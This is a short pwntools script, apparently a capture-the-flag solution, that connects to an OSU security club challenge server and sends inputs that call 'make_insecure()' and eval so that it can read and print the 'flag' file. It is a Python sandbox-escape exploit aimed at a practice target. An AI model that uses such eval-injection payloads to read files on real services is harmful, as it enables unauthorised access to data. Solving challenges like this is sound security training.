#!/usr/bin/evn python3
from pwn import *
import os

p = remote("chal.ctf-league.osusec.org", 8231)
p.sendline()

p.recv()

p.sendline(b"input()")
p.sendline(b'make_insecure()')
p.sendline(b'eval(a)')

p.sendline(b'input()')
p.sendline(b'open("flag", "r").read()')
p.sendline(b'eval(a)')
p.sendline(b'print(a)')


p.interactive()